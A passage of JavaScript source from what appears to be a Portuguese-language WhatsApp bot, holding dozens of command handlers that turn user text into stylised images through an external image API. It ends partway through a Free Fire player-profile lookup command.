if (!q) return reply(`📝 *EPHOTO TYPOGRAPHY MULTIPLE LAYERS*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "📝");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/typographymultiplelayers?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`📝 *EPHOTO TYPOGRAPHY MULTIPLE LAYERS*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Typography Multiple Layers.");
}

}
break;

case 'typographypavement':
case 'ephototypographypavement': {
try {

if (!q) return reply(`🛣️ *EPHOTO TYPOGRAPHY PAVEMENT*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "🛣️");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/typographypavement?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🛣️ *EPHOTO TYPOGRAPHY PAVEMENT*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Typography Pavement.");
}

}
break;

case 'thor':
case 'ephotothor': {
try {

if (!q) return reply(`⚡ *EPHOTO THOR*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "⚡");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/thor?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`⚡ *EPHOTO THOR*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Thor.");
}

}
break;

case 'textonwetglass':
case 'ephototextonwetglass': {
try {

if (!q) return reply(`💧 *EPHOTO TEXT ON WET GLASS*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "💧");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/textonwetglass?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`💧 *EPHOTO TEXT ON WET GLASS*

✏️ Texto: ${q}
}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Text On Wet Glass.");
}

}
break;

case 'silver3d':
case 'ephotosilver3d': {
try {

if (!q) return reply(`🥈 *EPHOTO SILVER 3D*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "🥈");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/silver3d?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🥈 *EPHOTO SILVER 3D*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Silver 3D.");
}

}
break;

case 'pornhub':
case 'ephotopornhub': {
try {

if (!q) return reply(`🟧 *EPHOTO PORNHUB*

Use:
${prefix + command} texto1|texto2

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "🟧");

let [text1, text2] = q.split("|");

if (!text1 || !text2)
return reply(`❌ Use o formato:
${prefix + command} texto1|texto2`);

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/pornhub?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`
);

console.log(data);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

let img = data.imagem || data.image || data.url;

if (!img)
return reply("❌ A API não retornou a imagem.");

await conn.sendMessage(from,{
image:{
url: img
},
caption:
`🟧 *EPHOTO PORNHUB*

✏️ Texto 1: ${text1}
✏️ Texto 2: ${text2}`,
},{
quoted:info
});

} catch(e) {
console.log(e.response?.data || e);
reply("❌ Erro ao criar Pornhub.");
}

}
break;

case 'neonlight':
case 'ephotoneonlight': {
try {

if (!q) return reply(`💡 *EPHOTO NEON LIGHT*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "💡");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/neonlight?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`💡 *EPHOTO NEON LIGHT*

✏️ Texto: ${q}`,
},{
quoted:info
});

} catch(e) {
console.log(e);
reply("❌ Erro ao criar Neon Light.");
}

}
break;

case 'naruto':
case 'narutoephoto': {
try {

if (!q) return reply(`🍥 *EPHOTO NARUTO*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "🍥");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/naruto?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🍥 *EPHOTO NARUTO*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Naruto.");
}

}
break;

case 'glitch2':
case 'ephotoglitch2': {
try {

if (!q) return reply(`⚡ *EPHOTO GLITCH 2*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "⚡");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/glitch2?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`⚡ *EPHOTO GLITCH 2*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Glitch 2.");
}

}
break;

case 'glitch':
case 'ephotoglitch': {
try {

if (!q) return reply(`⚡ *EPHOTO GLITCH*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "⚡");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/glitch?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`⚡ *EPHOTO GLITCH*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Glitch.");
}

}
break;

case 'pixelglitch':
case 'ephotopixelglitch': {
try {

if (!q) return reply(`🟪 *EPHOTO PIXEL GLITCH*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "🟪");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/pixelglitch?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🟪 *EPHOTO PIXEL GLITCH*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Pixel Glitch.");
}

}
break;

case 'neonlight':
case 'ephotoneonlight': {
try {

if (!q) return reply(`💡 *EPHOTO NEON LIGHT*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "💡");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/neonlight?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`💡 *EPHOTO NEON LIGHT*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Neon Light.");
}

}
break;

case 'frozenchristmas':
case 'frozen-christmas':
case 'ephotofrozenchristmas': {
try {

if (!q) return reply(`❄️ *EPHOTO FROZEN CHRISTMAS*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "❄️");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/frozen-christmas?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`❄️ *EPHOTO FROZEN CHRISTMAS*

✏️ Texto: ${q}`,

},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Frozen Christmas.");
}

}
break;

case 'foggyglass':
case 'ephotofoggyglass': {
try {

if (!q) return reply(`🌫️ *EPHOTO FOGGY GLASS*

Use:
${prefix + command} modo|texto

*Modos disponíveis:*
• bear
• cat
• flower
• heart
• sad
• smile

Exemplo:
${prefix + command} heart|Kyara`);

const axios = require("axios");

await reagir(from, "🌫️");

let [modo, texto] = q.split("|");

if (!modo || !texto)
return reply("❌ Use o formato:\nModo|Texto");

modo = modo.toLowerCase();

const modos = [
"bear",
"cat",
"flower",
"heart",
"sad",
"smile"
];

if (!modos.includes(modo))
return reply(`❌ Modo inválido!

Modos disponíveis:
• bear
• cat
• flower
• heart
• sad
• smile`);

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/foggyglass?apikey=API_KEY_SYSTEM&mode=${modo}&text=${encodeURIComponent(texto)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🌫️ *EPHOTO FOGGY GLASS*

🎭 Modo: ${modo.charAt(0).toUpperCase() + modo.slice(1)}
✏️ Texto: ${texto}}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Foggy Glass.");
}

}
break;

case 'dragonball':
case 'ephotodragonball': {
try {

if (!q) return reply(`🐉 *EPHOTO DRAGON BALL*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "🐉");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/dragonball?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🐉 *EPHOTO DRAGON BALL*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Dragon Ball.");
}

}
break;

case 'deadpool':
case 'ephotodeadpool': {
try {

if (!q || !q.includes('|')) return reply(`🔴 *EPHOTO DEADPOOL*

Use:
${prefix + command} texto1|texto2

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

const [text1, text2] = q.split('|').map(v => v.trim());

await reagir(from, "🔴");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/deadpool?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from, {
image: {
url: data.imagem
},
caption: `🔴 *EPHOTO DEADPOOL*

✏️ Texto 1: ${text1}
✏️ Texto 2: ${text2}`
}, {
quoted: info
});

} catch (e) {
console.log(e);
reply("❌ Erro ao criar Deadpool.");
}
}
break;

case 'comic3d':
case 'ephotocomic3d': {
try {

if (!q) return reply(`📖 *EPHOTO COMIC 3D*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "📖");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/comic3d?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`📖 *EPHOTO COMIC 3D*

✏️ Texto: ${q}`,

},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Comic 3D.");
}

}
break;

case 'colorful':
case 'ephotocolorful': {
try {

if (!q) return reply(`🌈 *EPHOTO COLORFUL*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "🌈");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/colorful?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar vídeo.");

await conn.sendMessage(from,{
video:{
url:data.imagem
},
caption:
`🌈 *EPHOTO COLORFUL*

✏️ Texto: ${q}`,
gifPlayback:false,
buttons:[
{
buttonId:`${prefix}colorful ${q}`,
buttonText:{
displayText:"🔄 Refazer"
},
type:1
},
{
buttonId:`${prefix}menu`,
buttonText:{
displayText:"📋 Menu"
},
type:1
}
],
headerType:5
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Colorful.");
}

}
break;

case 'lovecart':
case 'ephotolovecart': {
try {

if (!q) return reply(`💖 *EPHOTO LOVE CART*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "💖");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/lovecart?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar vídeo.");

await conn.sendMessage(from,{
video:{
url:data.imagem
},
caption:
`💖 *EPHOTO LOVE CART*

✏️ Texto: ${q}`,
gifPlayback: false,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Love Cart.");
}

}
break;

case 'captainamerica':
case 'ephotocaptainamerica': {
try {

if (!q) return reply(`🛡️ *EPHOTO CAPTAIN AMERICA*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "🛡️");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/captainamerica?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🛡️ *EPHOTO CAPTAIN AMERICA*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Captain America.");
}

}
break;

case 'bornpink':
case 'ephotobornpink': {
try {

if (!q) return reply(`💗 *EPHOTO BORN PINK*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);

const axios = require("axios");

await reagir(from, "💗");

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/bornpink?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`💗 *EPHOTO BORN PINK*

✏️ Texto: ${q}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar Born Pink.");
}

}
break;

case 'blackpink':
case 'ephotoblackpink': {
try {

if (!q) return reply(`🖤💗 *EPHOTO BLACKPINK*

Use:
${prefix + command} modo|texto

*Modos disponíveis:*
• jennie
• jisoo
• lisa
• rose

Exemplo:
${prefix + command} lisa|Kyara`);

const axios = require("axios");

await reagir(from, "🖤");

let [modo, texto] = q.split("|");

if (!modo || !texto)
return reply("❌ Use o formato:\nModo|Texto");

modo = modo.toLowerCase();

const modos = ["jennie", "jisoo", "lisa", "rose"];

if (!modos.includes(modo))
return reply(`❌ Modo inválido!

Modos:
• jennie
• jisoo
• lisa
• rose`);

const { data } = await axios.get(
`https://zone.api.br/api/ephoto/blackpink?apikey=API_KEY_SYSTEM&mode=${modo}&text=${encodeURIComponent(texto)}`
);

if (!data.status)
return reply("❌ Erro ao gerar imagem.");

await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🖤💗 *EPHOTO BLACKPINK*

👤 Membro: ${modo.charAt(0).toUpperCase() + modo.slice(1)}
✏️ Texto: ${texto}}`,
},{
quoted:info
});

}catch(e){
console.log(e);
reply("❌ Erro ao criar imagem Blackpink.");
}

}
break;

case 'balloon':
case 'ephotoballoon': {
try {

if(!q) return reply(`🎈 *EPHOTO BALLOON*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);


const axios = require("axios");

await reagir(from,"🎈");


const { data } = await axios.get(
`https://zone.api.br/api/ephoto/balloon?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🎈 *EPHOTO BALLOON*

✏️ Texto: ${q}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Balloon.");
}

}
break;

case 'tiktokphoto':
case 'photooxytiktok': {
try {

if(!q) return reply(`🎵 *PHOTO OXY TIKTOK*

Use:
${prefix + command} texto grande|texto pequeno

Exemplo:
${prefix + command} Kyara`);


const axios = require("axios");

await reagir(from,"🎵");


let [large, small] = q.split("|");

if(!large || !small) {
return reply("❌ Use o formato:\nTexto grande|Texto pequeno");
}


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/tiktok?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(large)}&text2=${encodeURIComponent(small)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🎵 *PHOTO OXY TIKTOK*

🔰 Texto principal: ${data.texts.large}
🔹 Texto secundário: ${data.texts.small}}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar TikTok.");
}

}
break;

case 'metalictext':
case 'photooxymetalic': {
try {

if(!q) return reply(`⚙️ *PHOTO OXY METALIC TEXT*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} KYARA`);


const axios = require("axios");

await reagir(from,"⚙️");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/metalictext?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`⚙️ *PHOTO OXY METALIC TEXT*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Metalic Text.");
}

}
break;

case 'starstext':
case 'photooxystars': {
try {

if(!q) return reply(`⭐ *PHOTO OXY STARS TEXT*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);


const axios = require("axios");

await reagir(from,"⭐");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/starstext?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`⭐ *PHOTO OXY STARS TEXT*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Stars Text.");
}

}
break;

case 'textsmoke':
case 'photooxytextsmoke': {
try {

if(!q) return reply(`💨 *PHOTO OXY TEXT SMOKE*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} CS GO`);


const axios = require("axios");

await reagir(from,"💨");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/textsmoke?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`💨 *PHOTO OXY TEXT SMOKE*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Text Smoke.");
}

}
break;

case 'rainbowtext':
case 'photooxyrainbow': {
try {

if(!q) return reply(`🌈 *PHOTO OXY RAINBOW TEXT*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);


const axios = require("axios");

await reagir(from,"🌈");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/rainbowtext?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🌈 *PHOTO OXY RAINBOW TEXT*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Rainbow Text.");
}

}
break;

case 'pubg':
case 'photooxypubg': {
try {

if(!q) return reply(`🎮 *PHOTO OXY PUBG*

Use:
${prefix + command} texto grande|texto pequeno

Exemplo:
${prefix + command} Kyara`);


const axios = require("axios");

await reagir(from,"🎮");


let [large, small] = q.split("|");

if(!large || !small) {
return reply("❌ Use o formato:\nTexto grande|Texto pequeno");
}


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/pubg?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(large)}&text2=${encodeURIComponent(small)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🎮 *PHOTO OXY PUBG*

🔰 Texto principal: ${data.texts.large}
🔹 Texto secundário: ${data.texts.small}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar PUBG.");
}

}
break;

case 'neonmetalic':
case 'photooxyneonmetalic': {
try {

if(!q) return reply(`⚡ *PHOTO OXY NEON METALIC*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);


const axios = require("axios");

await reagir(from,"⚡");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/neonmetalic?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`⚡ *PHOTO OXY NEON METALIC*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Neon Metalic.");
}

}
break;

case 'neonglow':
case 'photooxyneonglow': {
try {

if(!q) return reply(`✨ *PHOTO OXY NEON GLOW*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} KYARA`);


const axios = require("axios");

await reagir(from,"✨");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/neonglow?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`✨ *PHOTO OXY NEON GLOW*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Neon Glow.");
}

}
break;

case 'neonparty':
case 'photooxyneon': {
try {

if(!q) return reply(`🎉 *PHOTO OXY NEON PARTY*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);


const axios = require("axios");

await reagir(from,"🎉");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/neonparty?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🎉 *PHOTO OXY NEON PARTY*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Neon Party.");
}

}
break;

case 'naruto':
case 'photooxynaruto': {
try {

if(!q) return reply(`🍥 *PHOTO OXY NARUTO*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} KYARA`);


const axios = require("axios");

await reagir(from,"🍥");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/naruto?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🍥 *PHOTO OXY NARUTO*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Naruto.");
}

}
break;

case 'harrypotter':
case 'photooxyharry': {
try {

if(!q) return reply(`🪄 *PHOTO OXY HARRY POTTER*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} KYARA`);


const axios = require("axios");

await reagir(from,"🪄");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/harrypotter?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🪄 *PHOTO OXY HARRY POTTER*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Harry Potter.");
}

}
break;

case 'graffiticover':
case 'photooxygraffiti': {
try {

if(!q) return reply(`🎨 *PHOTO OXY GRAFFITI COVER*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);


const axios = require("axios");

await reagir(from,"🎨");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/graffiticover?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🎨 *PHOTO OXY GRAFFITI COVER*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Graffiti Cover.");
}

}
break;

case 'flamingtext':
case 'photooxyflaming': {
try {

if(!q) return reply(`🔥 *PHOTO OXY FLAMING TEXT*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Kyara`);


const axios = require("axios");

await reagir(from,"🔥");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/flamingtext?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🔥 *PHOTO OXY FLAMING TEXT*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar Flaming Text.");
}

}
break;

case 'cemetery':
case 'photooxycemetery': {
try {

if(!q) return reply(`⚰️ *PHOTO OXY CEMETERY*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} Gabs morreu`);


const axios = require("axios");

await reagir(from,"⚰️");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/cemetery?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`⚰️ *PHOTO OXY CEMETERY*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar imagem Cemetery.");
}

}
break;

case 'butterfly':
case 'photooxybutterfly': {
try {

if(!q) return reply(`🦋 *PHOTO OXY BUTTERFLY*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} KYARA`);


const axios = require("axios");

await reagir(from,"🦋");


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/butterfly?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
);


if(!data.status) return reply("❌ Erro ao gerar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🦋 *PHOTO OXY BUTTERFLY*

✏️ Texto: ${data.text}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao criar imagem Butterfly.");
}

}
break;

case 'battlefield': {
try {

if(!q) return reply(`⚔️ *PHOTO OXY BATTLEFIELD*

Use:
${prefix}photooxy texto grande|texto pequeno

Exemplo:
${prefix}photooxy Kyara`);


const axios = require("axios");

await reagir(from,"⚔️");


let [texto1, texto2] = q.split("|");

if(!texto1 || !texto2) {
return reply("❌ Use o formato:\nTexto grande|Texto pequeno");
}


const { data } = await axios.get(
`https://zone.api.br/api/photooxy/battlefield?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(texto1)}&text2=${encodeURIComponent(texto2)}`
);


if(!data.status) return reply("❌ Erro ao criar imagem.");


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`⚔️ *PHOTO OXY BATTLEFIELD*

🔰 Texto: ${data.texts.large}
🔹 Subtexto: ${data.texts.small}`,
},{
quoted:info
});


}catch(e){
console.log(e);
reply("❌ Erro ao gerar imagem.");
}

}
break;

case 'ffstalk': {
try {

if(!q) return reply(`🔥 *KYARA STALK*

Use:
${prefix}ffstalk ID

Exemplo:
${prefix}ffstalk 1809155897`);

await reagir(from,"🔥");


const { data } = await axios.get(
`https://zone.api.br/api/ffstalkv2?apikey=API_KEY_SYSTEM&id=${q}`
);


if(!data.status) return reply("❌ Jogador não encontrado.");


let texto = `
🔥 *FREE FIRE STALK*

👤 *Nick:* ${data.nickname || "Não encontrado"}
🆔 *UID:* ${data.uid || q}

⭐ *Level:* ${data.level || "0"}
🌎 *Região:* ${data.region || "N/A"}
✨ *XP:* ${data.xp || "0"}

❤️ *Likes:* ${data.likes || "0"}

🏰 *Guilda:* ${data.guilda || "Sem guilda"}

🎟️ *Passe Booyah:* ${data.passe_booyah || "N/A"}

📝 *Bio:*
${data.bio || "Sem bio"}


📅 *Conta criada:*
${data.account_created || "N/A"}

🕐 *Último login:*
${data.last_login || "N/A"}


🎮 *ESTATÍSTICAS*

⚔️ *Partidas*
Solo: ${data.stats_gerais?.partidas?.solo || 0}
Duo: ${data.stats_gerais?.partidas?.duo || 0}
Squad: ${data.stats_gerais?.partidas?.squad || 0}

